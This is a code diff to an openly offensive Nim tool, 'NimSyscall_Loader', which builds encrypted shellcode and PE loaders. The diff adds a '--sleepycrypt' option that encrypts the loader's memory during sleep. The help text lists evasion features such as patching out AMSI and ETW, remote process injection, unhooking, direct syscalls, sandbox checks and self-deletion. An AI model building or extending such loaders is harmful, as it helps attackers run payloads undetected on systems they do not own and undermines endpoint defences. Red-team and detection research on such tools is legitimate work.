@@ -23,6 +23,7 @@ import CustomEvasionStubs
 import GetSyscallStubs
 import SandboxStubs
 import Whispers
+import SleepyCryptSleep
 
 
 from system import io
@@ -56,7 +57,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.5
 
 Usage:
-  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --dll --dllexportfunc=<exportfuncname> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --x86 --llvm]
+  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --dll --dllexportfunc=<exportfuncname> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --x86 --llvm --sleepycrypt]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -105,6 +106,7 @@ Options:
   --debug    Compiles the binary in debug mode (More DInvoke output)
   --x86    (Compiles an x86 binary - have to cast some more function values before this works smoothly)
   --llvm    Add compiler flags for LLVM obfuscation, you have to set it up by yourself
+  --sleepycrypt    Encrypt the memory of the loader with SleepyCrypt # experimental (Pre-Alpha, not working yet for C2-Stager)
 """
 
 if (paramCount() == 0):
@@ -160,6 +162,7 @@ var
     debugMode: bool = false
     compileX86: bool = false
     noassembly: bool = false
+    sleepycrypt: bool = false
 
 let args = docopt(helpmenu, version = "NimSyscall_Loader 1.5")
 
@@ -254,6 +257,9 @@ if args["--obfuscate"]:
 if args["--llvm"]:
   llvm = true
 
+if args["--sleepycrypt"]:
+    sleepycrypt = true
+
 if args["--hide"]:
   hide = true
 
@@ -323,10 +329,9 @@ if (hellsgate and jump):
     echo "Error: Cannot use both --hellsgate and --jump! --jump can only be used with --syswhispers"
     quit(1)
 
-if ((csharp and shellcode) or (csharp and peload) or (csharp and peinject) or (peinject and shellcode) or (peload and shellcode)):
+if ((csharp and shellcode) or (csharp and peload) or (csharp and peinject) or (peload and shellcode)):
     echo "Error: You can only use one of --csharp, --shellcode, --peload, or --peinject!"
     quit(1)
-
 if (peload or peinject):
     let stream = newFileStream(filename, mode = fmRead)
     defer: stream.close()
@@ -787,6 +792,10 @@ proc FUNC_EXPORT(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BO
     return true
 """
 
+let SleepyCryptLoopExecute = """
+SleepyCryptLoop(10000)
+"""
+
 var stub = Cryptstub1
 stub.add(DInvokeBaseStub)
 
@@ -1039,6 +1048,10 @@ if (pump):
     for m in pumpargs:
         if(m == "words"):
             stub.add(genEnglishwords(rand(4750..7800)))
+
+if (sleepycrypt):
+    stub.add(SleepyCryptTestStub)
+    stub.add(SleepyCryptLoopExecute)
 
 if (debugMode):
     stub = stub.replace("import strenc", "")
